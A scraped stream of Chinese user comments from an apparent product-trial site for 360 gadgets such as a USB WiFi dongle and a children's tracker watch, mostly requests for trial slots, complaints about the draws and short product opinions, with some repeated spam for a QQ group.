完全没痕迹就好了
360，已经比同等类型产品遥遥领先，希望360创造出更加实用的东西，也希望有资格试用一下。
好用，但丢了，可惜，准备买U盘版
收到后，先充电，充电的时候开始手表没有反应是正常的，手表是不需要设置时间和日期的，都是自动校准的。精确定位是50米左右，正常定位在200-350米左右。电池使用情况，我昨天中午收到手表后开始充电到今天中午12点没电。需要一天一充。手机流量用的不是很多，昨天不断刷新实验，用了大约几百K的样子。
想提交试用报告，却不知为什么提交不了，点提交键不起作用，故先发到这里来。
不知道价钱怎么样？
不知道对家电有什么要求？ 
由于我用的是无线网络，等用宽带以后再用吧！
360，已经比同等类型产品遥遥领先，希望360创造出更加实用的东西，也希望有资格试用一下。 
希望得到啊 
这个高端大气上档次的产品还想烫斗啊
360，已经比同等类型产品遥遥领先，希望360创造出更加实用的东西，也希望有资格试用一下。 
科技杂生态
不知性能如何，人人拥有也许不是梦想。问题是如何由谁来普及的问题及如何普及需求与需求什么。需求可以被诱发这是未能发现的商业与一种新的颠覆机会发展蛰学……
瓯越，宏基。怎么不是联想！联想真悲哀！
ZH额这么转业是民用码？
真实感觉 扯 蛋疼……科技让生活更美好么，南辕北辙吧⑧糟蹋资源；我希望提高烹饪技巧谁能帮帮……%*&amp;）纠结，这么点需求没人能够满足……什么世界啊 my god
不过这么牛逼的产品冒事很强悍，很想尝试后发表看法。……&amp;谁能给个机会。@me TK
ZH怎么看都非主流不可，我这几寸地方到底是给谁呢？  我更纠结。
狐假虎威  还是狼无户口 羊入虎口的催化剂，怎么都感觉好笑。别误会我不是狼&amp;%……（
作为吊坠我考虑送女朋友一个，需要的可以 @ me 非诚勿扰
这个可以有   量产化谁能通知我  这个一定要有；这本、、这个一定要有！怎么这么量身定做感觉呢。验证了一句旷古不便的定律人都是爱玩的天生动物。
最好一个重型装备让人疯狂一个轻型武装将时间收集发挥衍生延伸放大……人都是在玩中长大也许这就是未来新的发展法则。
也许孤独求败不再只是专利户的专利在你的世界。也许只是在你的世界，、。
还在提这样的东西时代已经落伍还是我已经落伍，我顿时在看到后开始怀疑这世界同时还有自己。原来我没错，是这世界一直在犯错。验证了土豪的一句经典放错就是一种成长！@#￥！！！
我这一直在想思考一个很纠结很久的问题为何一直在打印  需要这么复杂嚒；小时候窝们都是玩积木长大的亲。不得不佩服试用挺管用，打一个试试亲
这是偶发现的最实用的一款。不苟 真实的说还是太缺乏创意{{{(&gt;_&lt; )}}} 。这么对于一个这样的题材。试想下世界都是这样的座椅该是汝河的美好，届时   我不会再回家，……一个大同世界真的已经来了
亲 \ 爱的 \…^^&amp;&amp;……偶来了
YIZ一直在是靠是否是多此一举  徒然 发现这世界就是多此一举
为什么不出老年手环？
希望不断创新，能给我们大家带来更多，更好用的产品！
看到这  我第一次崩溃 这假货真实货让人忍俊不禁
它混淆了物资间概念。世界本就是混乱你在试图凿出并优化Ⅶ应用。；
不在于形式而在于内涵  这是一个有内涵的设计。我辈感觉深邃  你在往哪延伸来遭到思绪本身码？
设计有N钟语言今天我错了世界是由语言组成，就看你如何编码这世界，到底谁是非主流，且走切珍惜，   不过还有机会吧
好东西，不知道投影效果和投影距离如何？
切代取个接地气的名称：东方智能电动车
一亿靓的造价陈本不知道是否能够带来普及？不过这也只是想想看
感觉有点无懈可击，无邪科技，美丽无邪
用他来控制手机，回事一种真样的纠结。这是世界最高的楼，而这是这里最高的建筑，谁更高呢  ；在思考控制手机干什么来着蛰人想不清中
日本人不光光多此一举的做些多余的事，原来只是因为这本身诞生于多余，而日人往往干多此一举谁叫这是白天，难道去歇菜。
多次一句  多此一举……（*）（——还是多此一举
事实上日本本身的行为就是存在多余
世界需要一个近乎完美的世界。
有内涵的东西往往都U不是一个惹干的货。买不起人家的就自家做。
当这个东西成为一个无形存在的产品，这世界的、太疯狂。！！！@@￥%
诺亚方舟半成品0.1版本
外形盗版怎么看都像扩展坞变形金刚版
这家伙集成到手机你会用？NO 分开你会用更NO 还是集成到一起吧   问题是陈本问题 与需求解决价值多少？
进化弱智的苹果码？你人真好 真好看。
往往   我晕 我晕 我晕 我晕 我晕 我晕 我晕 我晕 我晕 我晕
美往往由不真么美的东西组合而成，把美人放大到一定比例只是细胞  当然前提还有骨骼…………人忍无可忍都会咬人的。（*）——还有人是不能说的东西，因为没法说，你有你的规则我有我的自由  ok】
I 咯呗love   U  你知道码
这是玩具码，哦 都是玩具只是人往往被玩具玩而已 真实它二姨
看到这我首先想倒是兜里的银子 不是为了买⑳谁能量产它
不用花钱就能用它 
2K屏成为标配又能说明神马？硬件智能堆砌起长城却不能抵挡住侵略#@！#@￥%……&amp;*
好像还缺什么  原来只是外观  其他什么都没  视乎是如此  也没有可以参考对标的标准  苹果不是也不可能永远是吧
它控制  还是控制它 中央处理器 还是扩展坞 前者还是后者  内涵还是外喊 不过这东西不错。
个人感觉，不切实际。
不切实际。
这个不错，赞一个！
拯救了没有闪光灯的手机~
看看罢了……
Life&#039;s Good ！
看看罢了……
以后看看吧。
这价钱……
不错，赞一个！
期待哦，今天看到，好喜欢。
支持新创意，预祝越做越好
创意非常棒， 一直很喜欢360， 期待更多新宝贝的出现， 友情建议一下，本人很期待360wifi能控制电脑的更多功能！例如：主界面，以及电脑里面的一些简单的软件！
要是在加个360独创的“PE”系统那更好了。 PE是什么大家也懂
GOOD!360
支持360，希望一如既往的好！
说好的3.6呢。现在9.9了。？？这么明显的欺骗消费者，不怕引起公愤？
这个挺好用的，学生党上课的时候插在电脑上，可以打开u盘还可以骗骗老师，哈哈哈，可惜我这个学生党人品不好，从来没中过，这个u盘太贵了，学生党买不起，要是这次没中，就与你无缘了，求回复求祝福！
什么时候出来啊，天天看
好倒是好价格是硬伤啊
360随身WiFi 4G抢先开箱照http://www.pzhi.net/archives/289 360随身WiFi 4G差旅体验http://www.pzhi.net/archives/398
很不错哦这的购买
一次都没中过啊 。。。。。。。。。。。。再不中真的没信心了
创意非常棒， 一直很喜欢360， 期待更多新宝贝的出现， 友情建议一下，本人很期待360wifi能控制电脑的更多功能！例如：主界面，以及电脑里面的一些简单的软件！ 
我就是想知道天猫上的是正品吗？是正品的话会不会是工程机之类的测试产品？存在弊端什么的吗？为什么360现在不发售，却在天猫上发售？？？？
智能产品交流群：31830793
智能产品交流群：31830793
智能产品交流群：31830793
是的 这个是智能家居的一种 智能产品交流群：31830793
智能产品交流群：31830793
好点不严重滴 智能产品交流群：31830793
智能产品交流群：31830793
积极参与下
性价比太低了。。。
这个建议很好！
这玩意电池能用多久？！要是没注意到电池没电了，怎么办？怎么不设计成光能的？
如何制作打印所需的图纸是使用者在使用过程中的一大难题！
关键是性价比啊！！！这么高科技的东西估计不便宜
期待啊！价格亲民一些吧！
貌似很神奇！能具体做到什么程度呢？
淘宝早就有卖的了
没有幸运过
这个太好了！
这个可以尝试一下
希望可以有啊
能通用就好啦
期待发售，越快越好
不知道都能玩什么样的游戏哦。
很棒的手环啊。期待。
可以上传报告了。快再试试吧。
这东西到底好不好用呢？
很有创意，只不过售价太高了
手机也能用就好了
这个很赞！！！
路过看看……
据说有app呢，有木有下载这个app试下啊？
先支持个先\(^o^)/~哈
不是很适合中国国情啊。
360是个创意公司，产品太好了
非常期待中
支持下，希望可以使用
一直期待着 也没申请成功 什么时候卖啊
我也想知道都能玩什么游戏啊 、
不要和我抢。我家刚好有MINI  
支持360wlfl
支持！我要一个！至少可以在U盘里带上驱动，不用总是上网下载驱动了
不错，还有续集吗
  只能三星上用吗？无线充电什么意思？
真好的汽车，节能环保
想要啊！期待期待。。。。。。。。。。。
使用了一段时间，非常不错，无论是穿墙能力，还是设置，都简化了很多。信号干扰也没有。可以试试开发和这个玩意相连接的智能家电。
什么时候有得预约抢购？什么信息都没有···什么销售方式。
楼上太有才了
很好用，也漂亮，就是发热。
2代？貌似瘦了很多
正解！！！
再好，又弄不到有什么用？
这次会上市出售吗？
样子挺好看的。支持。
写的很详细啊,通俗易懂,谢谢分享~
好扯蛋的idea
这个不错，赞一个！
功能很好，就是用这不太习惯，有时候收集在兜里，一挤压就误按了智键。
我看这个有点意思哈
评价很认真！
外形超酷，功能强大
好小！！！！！！
360一直都是非常的领先，不仅在科技和产品，思维和产品定位都是非常的超前，一直支持360
我们其实并不需要这种东西！
哈哈哈哈哈 
好高大上哇
亲在哪儿可以买的啊？淘宝上的靠谱吗？ 
亲，在哪儿可以买的啊？淘宝上的靠谱吗？
发表的评论怎么不见了啊？？？
这个在哪儿可以买啊？淘宝上的靠谱吗？
这个在哪儿可以买啊？淘宝上的靠谱吗？
这个在哪儿可以买啊？
感觉不错啊！很酷的外观，希望功能不算鸡肋！
很小巧嘛！不喜欢耗电量大的电器！
期待早日发货哦
看来申请到一代的才能申请到二代的啊，谢谢你的提醒，以后也别费那劲申请了，都是内定的了~
期待，加个20以内，可以接受的。
这个好，遇到酒局直接果断脱身。哈哈
还能说些什么了，又新颖的玩意。
背后的接口好少啊，就的2个。改成4个接口就好了，因为家里的线多啊。
背后的接口好少啊，就的2个。改成4个接口就好了，因为家里的分线多啊
同意楼上。
支持一下 好运！
力挺360随身WiFi,希望能选上(让我当一次试用官吧).
我已经有了
我个人还是觉得远大的空气净化器性价比高，HEPA过滤网的净化器风阻大，更换成本高，建议360可以和远大合作开发一款智能空气净化器
对从事管理人员的我来说，工作离不开电脑和手机。这是一个利器，有了它，可以随时办公，传送文件。
拉仇恨的么，两个都申请成功了竟然，加油，期待更精彩的功能报告
希望能得到
好东西，值得购买
是纳米级的，但对于安利产品我不想多说，只能说土豪原意砸钱给安利我们不能阻止，而且还是砸给美国佬
刚刚提交了申请，希望别又被落选了。360加油。
送人了，很好用。以前买了一个。
想要，这个概念产品很不错啊
上次就落选了，现在这个是平常都很实用的，希望能让我体验下啦
已经可以购买了600多
我真心喜欢智能手表，现在还没发辨别优良好坏 
一直在用，很不错，很好用
没申请到可惜，什么时候卖赶紧买一只
求试用啊！！！！
不错的理由，我用的netgear  也想对比一下。
360的老用户了~08年到现在就一直用360~希望能被选中啊 嗨 试用报告会写的很好的 呵呵
什么时候开始卖啊 关注好久了 免费试用也申请不到 好像给家里孩子买一个 快点卖啊 
给个消息吧，什么时候再发售？不然我去买极路由了.....
加油。希望能有报告看
坑吧，自己内部自己玩。 你很厉害一代能拿到二代又能拿到。 无语~~~
绝壁写好报告。
天天在这里秀，没能买到一个产品。连一代都买不到。360有个屁用。
外形不重要，重要的是效果，内在的滤网，这个有多重，去除固体颗粒物最小直径多大，去除甲醛效果如何，这个都需要考虑，还有风量也是重要的考虑因素。
360忠实用户，免费赠送一个！ 
把360随身WiFi结合进去 
好像被选中
谁知道大概多少钱啊 还有需不需要叫流量费 谢谢了！！
好棒的网站，迅速推广
我家都是三星手机，快点出来就好了
为了满足市场需要，应该大批量进行生产。不要在搞预约销售了。
顶起 一致看好360 “希望躺着也中枪”好东西人人分享
感觉外观不错，手表的主要功能是查看时间，希望增加的其他功能不要是鸡肋吧。还有就是表的厚度有待改进。
我一定会得到的~
什么时候出结果啊 非常期待能中
自己人才能申请到吧。白浪费时间了
设计产品，应该要自己画图吧。 这个有什么办法解决吗，不是所有人都能画出图纸
i like that kinda things
背后的接口好少啊，就的2个。改成4个接口就好了，因为家里的分线多啊  为了满足市场需要，应该大批量进行生产。不要在搞预约销售了。 
真心喜欢这个。
期待能中！
有密集恐惧症。
11连败了，试用太坑，
什么时候开卖啊，大家都在等，我想给小孩买个，老是没有销售的信息！！！
这个哥们的儿童卫士一代不是在奇酷中的吧。名单里没有他。应该只有二代是在奇酷获得的。
那你有很多酷币了啊。快去参加今天的活动啊。
cost too much .what&#039;s worse ,sensors ought to stay where needs them ,to get all sensors being the same place is not even close to interesting.
我也一定要得到，  我有好几个360WiFi了，就是没有这个带U盘的！
申请了代理  价格优惠 
16美元有点贵了吧。360快出一个把它秒杀。
求试用，阿弥陀佛
跟小米手机好像不是很匹配，有没有360手机送一个呢？
我也很想试用，360随身wifi用户一枚~
很时常，很中意这个
看了所谓的测评，很失望，根本没有相关的专业数据啊！例如无线带宽最高支持到多少兆，因为本人办的是20兆光纤独享，所以对路由器支持的最大速度一直有关注！而至今为止尝试过包括TPLINK在内的十几款路由，能以无线支持速度接近有线的路由器真的是少之又少呢！万恶的预约销售也使我这个万年倒霉蛋拿不到设备，只好期待相关数据了！支持360的产品，真心希望它越来越好！
没见孩子出镜，只见两代儿童卫士。。。
希望试用下！
我申请好几次，不知道这次能否通过。阿弥陀佛 
这个高端大气上档次的产品还想烫斗啊
不过好像要这个高端大气上档次的产品还想烫斗啊  
不错哟，一直想弄一个。
用前置摄像头的时候就更清晰了！！！
呵呵，我喜欢
期待正式销售，别总是试用和抢购，不好抢啊！
确实        不错
我就没中过.........
一代跟二代都申请到了？不得不怀疑是内部的啊，还是说只能申请到一代才能得到二代？
哥们儿你运气忒好了吧，一代二代同事拥有
为啥又没我。。。。。
为什么没问
没我。。。
二代都出来了，一代还没用上市公开发售，到底是个什么意思啊？很多家长都需要啊！尽快公开发售吧!
中啦中啦中啦
有猫腻的试用，估计都是内部人。骗人申请，几次都没成功
习惯没中签
唉，申请了好几期了，都没中，每次都写了自己的建议，郁闷啊啊啊啊。
求试用........................................................................
运气太好了吧
有英文版吗
前面的线路隐藏起来比较好
求试用.................................................................................
喜欢360新产品
真想来一台，可以DIY！！！！！！
求试用....................................................................................
求试用................................................................................
继续没中，继续关注
表带要是金属的就更好了！
没用过呢，很体验一把！
感觉真心赞啊……高科技
在科幻点！
不会真是内部定的吧，那申请还有啥用？？ 
哇哇哇，好好的赶脚啊……
什么时候卖？
我也申请好几次了，都没通过
没中，是真的吗
我申请好几次了，都没通过，心都凉了
好想给宝宝申请到一个呀！儿童要出镜啊！
没看懂              11111 
可惜没有申请到
是滴 很不错的  扶老人必备
这个很不错，。
实用性怎么样？
换购是不是包邮的啊？
这个应该要很多米吧
360已经出了  360防丢卫士 产品团队：360 将防丢卫士佩戴在你的钱包、钥匙等物品上， 只要物品离开身边的安全范围，手机会立刻发出警报提示。 同时，如果你找不到手机，按下防丢卫士右下角的呼叫按钮，手机便会发出“呼救声”告诉你它在哪。
一代二代都能让你申请到，要么是你的好运真的很逆天，要么就是内部炒作了。我说嘛，每次的试用评测都这么专业！ 我觉得，如果真想让广大的用户都试用到360的产品，就应该扩大试用范围，多听听不同使用人群的意见，哪怕是一两句简单的使用心得，这样才有助于产品性能和客户体验的提升。而不是让使用评测成为营销的推广软文。
秒杀16美元 估计360出16元以下即可购买 
很赞。。表示很实用
楼下你在哪搞到的 ？
老是不中~
能在上面剁排骨不？
一年了。。 哈哈。。 从来未成功呢。。
要是设计成通用的ok了 
怎么才能中啊
1代是转微博是抽中的，2代是奇酷抽中的。 如果说我的评测报告大家认为很专业，希望奇酷考虑下增加我的试用几率。 
一直很想要。
有人买吗？有人用过吗？
今天的酷币兑换还真的没有搞到，我已经有90酷币了，但是瞬间所有奖品都被抢走了！
是挺专业的报告,看过一代的报告都是那么专业 我要申请到了 根本不就弄不出来那么专业的报告 遐想中.......
这个东西很厉害啊！！ 不过终端接口是个硬伤。 弹出式的时间久了没法用·  直接外挂的影响美感· 看怎么个处理法吧·
顶起.赞一个
不太好 吧  以后都用抽纸的咧 卷纸放的话，不太雅观
 MOD-t 3D打印机 比这个便宜多了 
没中，有点小失望，默默关注中......
但是没有地买   天猫上也有便宜的   晕 好混乱的市场
只适合调情吧       小三必备哦
最后一张图感觉被烧了 
太大了，其实就是一个支架而已。第二张图里有个 丁点的电源。其实节约不了多少空间 
申请三次了，这回特意去了趟寺庙，摇了个上上签，应该这回可以中了吧。。。
没有中，有点伤心
好想要啊。。。
希望这次有我啊
拜托 有阳光的地方就有紫外线好吧？  
顶 看着就精妙 酷
汽车这儿都有，服了360了
我是第1234个点喜欢的　　
为什么没选我呢  前几天买了个紫色的360随身wifi还是挺好用的，也挺好看 希望这个盘版的会更好！
很期待这个U盘版的，以为还可以用来帮自己和同事。朋友安装系统用
东东真的很有诱惑力，不错。想看看360随身WIFI和它倒底差在哪里？！
这一个路由器不错
饥饿营销  学小米的
很喜欢这个产品却没有中！
没中~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
又一次没中
加油360！
看来连中两次的结果就是再也不会中了！
恭喜恭喜。
顶楼  看着你们都很容易搞到 RP真好
一次都没中过有人还连中二次GM你太那个了吧一次没中过啊
说的好，事实却是如此。
快点儿开啊，就算不发，我买一个总行吧，什么时候上市啊？急需U盘啊
U盘容量其实可以再大一点，没有网络的时候也可以存东西，云盘也是需要网络的啊，随身WiFi有软件版的，存储的意义更大哦
求试用............................................................................
求试用................................................................................
求试用..............................................................................
求试用.................................................................................
求试用.............................................................................
求试用.........................................................................
求试用...................................................................................
哈哈，很久以前的事了，那时候申请的人少，坚持！好运总会降临的！
希望自己有机会申请到这款宝贝！！
又一次没中
求试用...............................................................................
求试用.....................................................................................
求试用................................................................................
yes..............
成年也能带 可以叫老公卫士了
申请好多次了，都没有中，希望这会能中
求试用...............................................................................
求试用...................................................................................
求试用.................................................................................
求试用..............................................................
求试用............................................................................
求试用.............................................................
很好很强大
求试用........................................................................................
给个试用下
怎么又没中
好希望可以拥有一个。
投影清晰度正有那么好吗
简单易操作！
好吧！就这样
中了 就批量入手  哈哈
希望能抽中 ！
喜欢~~么么哒~~
嗯 喜欢 那就尽快把它带到我们的生活中...因为我们需要它！加油！
从13年就开始关注360儿童安全卫士，申请了几次，却什么消息都没有？伤心，什么时候才轮到我送给宝贝当礼物啊！
希望等下自己能够抢到，力挺360
比2方便,可以把一部分资料直接放到U盘中有网络时再转到云端!
希望能中！
你也太幸福了,一代和二代你都有了.
很期待！看着很不错的样子！体验了那不是更爽！
这么好的东东我想拥有一个...哈哈  加油   360儿童卫士 2   大家都在期待你的到来
不懂这么小怎么用
估计是从内部员工优先试用,鄙视360
看来我们都被当枪使了  
晕啊，顶多10秒就抢没了。
上次申请没有成功，这次希望可以抽中，期待中！
你这还是家用吗……家里面PC一台就够了吧…就算两台也不是两个在一起放着吧…我觉得1个足够了…
按键手感不错，外观可以，就是误触率有点高
这个东西很厉害啊！！ 不过终端接口是个硬伤。 弹出式的时间久了没法用· 直接外挂的影响美感· 看怎么个处理法吧· 
支持下奇酷
太好了，终于兑换成功啦！
此乃学生党之利器也
应该加个荧光
科幻感很强 
呃，一代二代一起试用？？？这也太假了吧！
一代果然不是奇酷网给的。
这个哥们一看就不是内部人员吧。坚持这么多期就中了这一期。
我90个哭比了 
不知道真能换到个360儿童卫士  
我只要儿童卫士 
从内部员工优先试用,鄙视360 
还有一起是我主动放弃的 那个是note用的手机套，哥们儿想着咱就不凑热闹了。 每想到酷币还能换东西，亏了10个酷币！要不就能去抢必中卡了！
如果分辨率能达到720P，价格1200以内，我才会买
通常这种手环都是跟手机搭配使用的，流量自然是用手机的
在北京吧？哈哈
360怎么不自己出一个
11132
申请好多次都没有成功，真心希望这次可以成功，我之前买过类似的产品，真的很好用，支持奇酷
居然中了，跟了6次了，功夫不负有心人啊！
智键配米健APP用 
中签了，等待收货，提交测试报告
希望可以抽到吧。 支持。
真有那么好？
作为一个电脑工作者 ，这个WIFI感觉很合手，希望抽到
作为一个商务人员 ，感觉这个wifi很好用，希望抽到！ 
有想买的冲动
看起来应该很好用。
360勇往直前，越做越无敌！！赞啊！！！
貌似感觉不错
这个wifi只有u盘大小，对我们这种工作来说非常方便，希望可以抽中！
这个正好符合我的需求。之前回家外婆很喜欢用ipad看照片，就是太难学了。不过搜了一下，Family好像还没有出IOS版。
何时才有卖呀？等的花都谢了
人家都发布了,快卖了!
至今为止奇酷试用申请人数最多的一期，中签名单终于公布了。儿童卫士2实在太受欢迎，原定100个的名额明显不够。联(wei)系(xie)儿童卫士团队再加了50个也似乎远远不够，因为这次总共有172941人参与申请！所以，各位亲爱的小伙伴们，如果没有中签也请不要气馁，儿童卫士2即将公开发售。而承载着大家希望的中签的幸运儿，还有理由不写出精品报告来吗？
对一个在外经常出差者来说，WIFI对我的工作是必不可少的，希望能得到
这是骑虎说,期待开卖 
希望能配专业图形处理和不错的散热
真的没啥指望
好有创意啊。。。
太厉害了，不错不错。关注中……
恭喜恭喜！
可惜没有申请通过啊！只能等买了
我兑换360安全路由成功！感恩所有人！我爱奇酷！！
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 www.jianyuezhimei.com
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 www.jianyuezhimei.com
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 http://www.jianyuezhimei.com
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 http://www.jianyuezhimei.com
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 http://www.jianyuezhimei.com
哎呀，没中。好伤心！
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 http://www.jianyuezhimei.com
智能家居技术交流群：31830793 （非智能产品爱好者禁加），智能家居解决方案提供商 http://www.jianyuezhimei.com
经常出差，wifi个我的工作带来很大的帮助，希望抽到！！  
我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！我要！
神马时候上市啊?都等了一年啊!
感觉这个360wifiU盘版很不错! 上次申请没有成功，这次希望可以抽中，期待中！ 
我也想抽到流量伤不起呀还是360好希望抽到大爱360
不会吧，我抢了一个手机套。
没中，好伤心，下次继续努力吧
感觉会很时尚
为什么没有呢
这种无需电池循环使用的点子非常好
有爱疯的吗？
出了无线wifi功能，云盘功能和优盘功能以外，其实，也很期待它的急救功能。
还希望得到，很期待
我最近会多活跃的。希望得到
第一兼容手机要广，第二要做到真正一定距离防盗防丢失，第三价廉物美！
能声光电一体防盗防丢！最好也能兼容电脑！
我都落选4次了，这次让我中吧
求得到!!!!!!@!*＿*
希望可以用到   很实用的样子
什么时候出
一直在用360随身WIFI，感觉不错，这次出U盘版的，希望能抢先体验下~360比以前进步很大，多多支持！
呵呵，真奇葩  
很有诱惑的全能神器，真希望能有一个去和朋友拽一下！
求得到呀，，，
要多少刀啊！！！
申请了好多次都没中这次让我中一个吧，毕竟是用了好几年360的老用户还反馈了好几条建议改进呢
我现在想提个意见 能不能让360WiFi变成信号增强器 就是让接收信号的时候 好些
这多少钱啊。估计会很贵。。
差不多没有用
我喜欢这个东西！！！
我很适合用这东西
用360随身WIFI，感觉不错，这次出U盘版的，希望能抢先体验下~
中个中中中中
不错，两次了要么开会，要么出差，竟然有这机会，期待拥有
如果切排骨，900大洋不就飘了么？
很多路由或者交换机的背板带宽都不够的，基本上都不会标注背板带宽是多少，其它参数都是忽悠人的。
不是内部人 
假什么我就是1代2代一起试用的
很实用的东东。
中中中中中中中中中中中中中中
中中中中中中中
挺喜欢这个产品的，可惜没中，o(︶︿︶)o 唉~~~~
我也要。。。。
每次都在申请,希望亲爱的奇酷网人员给我这次试用的机会！
3D打印技术材料难题解决了？
这个东东看着挺不错的哦~
没中。。。。哎。。。买又买不到，无语了
奇葩,..... ....,... ..,,,......................
360WIFI U盘版！参加几次了没中过，希望这次能给个试用的机会
这外形这大小这配置，一万肯定不够
但是360的防丢卫士估计要电池。。。
爱歪坏，爱360随身WIFI
一切皆有可能!!!!!!!!!!!!!
贵吧.............
挺喜欢这个产品的，可惜没中，o(︶︿︶)o 唉~~~~ 
普通的血压仪200到300元功能基本一样
奇迹总会出现在自己眼前
建议360奇酷的创新设计，颠覆传统的外观模型，能否把家庭安保系统，设计成象一张风景优美的山水画哪样，一切设置尽在其中。即使外来不良者登堂入室，也不能发现家庭安防设备，老百姓需要科技创新产品。
我说的是中国创新的产品，不是推销外来成品。外来产品有诸多不便。如果360创新产品能占领世界，哪才是中国骄傲！
看起来还可以，就是不知道实际使用感受
自奇酷试用以来，认真参与，认真评论，神啊，这次能否试用？
买个熨斗就行啦，外观差不多
一口气抢购了30个，现在还剩20多个，需要的朋友我免费送了，运费自己出，没啥用
在购买了智键的同时，我也买到了米键，经过仔细比对，360智键是3针的，米键是4针的，懂行的朋友我就不多说了
什么手机型号
不见了360随身Wi-Fi1代，希望能体验u盘版
从来没有机会能够体验奇酷的产品，，希望这次好运
.... 速度这么快？
跪求发售，让我们这些圈粉焦急啊
空间电磁波功率一般都比较小，如何保证设备随时有充足的电力工作呢？
高科技 好厉害
只求价格亲民一点啊
能适用多远的距离呢？
天灵灵地灵灵，各路神仙快显灵
砍骨头类的食物咋办，一刀下去是不是要再买一个- -。
智能家居技术交流群：31830793 （非智能产品爱好者禁加）
不错哦  。。
加油。祝福你中签。
希望能体验u盘版
这个光线很漂亮哦。
期待  中 
确实是个好东西！
又没有，有点郁闷了
厉害，我有就卖你
719572441
第二次申请就中了。确实幸运。我一直以为幸运与我无关的。。本来也一直想要一个这个，但是又买不到，刚好新房到时想检测空气质量，相信帮得上我的大忙。谢谢360，谢谢奇酷网。
10秒钟都没有到就没了
不错，值得拥有啊
这个东西想入手一枚，不晓得贵不贵。
产品不错，只是雏形，还有待改进哦，功能有点太单一了
顶一下，360加油！
360官网标价99，京东价199，尼玛，京东才是最大的黄牛。
可以，这个比手表要好，可以随处放，不容易被找到
键盘的键要是平的就好了。往外凸的不喜欢。求同感
价格338元 还在等什么？赶紧拿起鼠标把页面关掉
我驳回我刚才得话，这个键盘还挺便宜的 。比市场上的便宜不少只要39.9
有了这个，再也不怕丢钱包了
外观比黑的那个好看多了。
可是每次只能用一个功能？
家里缺个无线来源，正在考虑是弄个无线路由器还是弄个随身WiFi
很不错，已经申请了，希望试用体验：）
呵呵，1元我买！
超赞哪能买到啊？
希望我这次能够体验一下360随身wifi U盘版吧，，加油
360总能想到许多新鲜的东西，买过随时WIFI，感觉内置U盘应该更方便使用
真的非常失望
内定应该不是吧，我没有一代只有2代。参加活动多，论坛的微博的，智键啊WiFi啊都中过的。
看着就不错。可惜我没有啊
这次希望能够体验一下360随身wifi U盘版
不错的东西，应该很实用，个性化，人性化。顶
还是没中6.7次了唉。下次努力。不过支持360，支持奇酷网
肯定老贵了吧
滑板也电动了还不如买辆踏板用，极限运动的乐趣荡然无存。
这个产品不错嘛
好东西就在身边，希望能体验下。希望4G版能用更多的网络格式
防盗如何？
没有中！郁闷！！
在按了500次之后  不太灵敏了    而且时间长了  智键的按头有点汗蚀  微微锈
这也算测试报告？
早就有卖的了，360现在还创意中，是不是太慢了
为什么？？？  
根本抢不到
qikuvb
什么垃圾玩意i
希望下次可以中啊
灯泡寿命多少小时，价格是多少
100酷币就是花不出去,看来不是你想花就花得了的!求酷币换产品,抢来抢去的,我看我门都成乞丐了! 
申请也申不到,抢也抢不来,买又买不了,看来只有犯罪了!
哪天看到一个戴360儿童卫士的直接上去就咔嚓
 我还舍得切么... 
看完感觉算了吧
- -  还是买块豆腐撞死的合适
试用开回家
太简单了吧。我们这些就看图片就行了。拍戏外景吧
不是去年就有卖的了嘛。。。
我觉得也简单点，
我有花园，但是我还是觉得贵了
这个分辨率的投影仪，某宝上超不过1000块。。。
其实我觉得，如果我是奇酷我也给一代试用的接着二代试用，因为这样才能对比的反映出产品不足，虽然我毛也没中上，
就只是监测一下？现在空气质量用肉眼都能判断了。。
只是监控，有什么用？现在雾霾用肉眼还看不见？
价格呢？太贵被人抠走了怎么办？
这么小体积，肯定是用LED光源的。。。
很有意思，但是如果卖个1W多，估计还是没人要，2000以内还差不多，毕竟不能完全代替洗衣机
呵呵 可以用的
出行必备品
家居生活的好东东
好小巧，精致
商务应急之首选
电池容量还要做大点
能识别带方言的口音吗
很好，我喜欢
我喜欢，期待中
好软！！！！！！
是不是安卓系统
感觉内置U盘应该更方便使用
好想要！！！
有什么实际性的作用吗？还不如做一个配套手机的移动电源手机壳来的实在
这个什么时候发售啊？期待中。。。 
希望可以选到哦  哈哈哈 会认真写报告的~~
整体感觉还是不错的。不过看图片上的系饰品那个口有点厚啊，不好系
没有阳光怎么办 而且铺水管很贵  WIFI等芯片很费电
0.00000秒抢完
万一进水了……
屌丝买不起啊有木有！！！
希望这次可以选到哦，希望能够体验一下360随身wifi U盘版 。
现在美国已出售
手机软件已有
我写的都是事实，也不给我试用！非常生气！
感觉技术含量不是很高的样子啊，就是动力系统小些，要是悬浮的那才叫高科技，就这个还两个电瓶车的价格？还而已？很便宜吗？再便宜有白菜便宜吗？
不会很耗电的，而且这是太阳能的。
这只能用 WiFi 吧。
估计亲民不了，离眼睛距离那么近不知道长玩会不会影响视力，看介绍说好像只是考虑了戴眼镜和视疲劳没提会不会影响视力，另外建议在一个宽阔的空间玩，不然小心打到东西或者其他人。
看着很不错啊，只是不知道天朝交警会不会没收，我们这边不定期没收电动车。助力车，不知道天朝领导怎么想的，既然不让用电动车就干脆别让卖啊，一边还让销售，一边还没收，真是没地方说理去。
感觉还是不错的
呵呵我喜欢
嗯嗯   很不错   喜欢
不专业啊，这个配置怎么样啊？
期待更新，需要更精彩的内容。
希望能够得到，谢谢！
可惜孩子不是富二代，给孩子买这么奢侈的玩具这是想从小培养孩子拜金观吗？
同求，不过基本没戏，顶多试驾。
还创意中？网上早就有的卖了。
多少钱？哪里有卖？
没中，郁闷
我5月20号抢到一个应没有iOS APP不想要
介绍的不错，市面上专业级投影仪也很难做到1080p。这么小的东西也可以？还是持有怀疑态度。而且，这么小散热如何解决？别看个半小时就当机了。
真的好喜欢，很实用
售价高，待机短啊，有点不喜欢
好喜欢好喜欢啊！！！
价格好啊！！
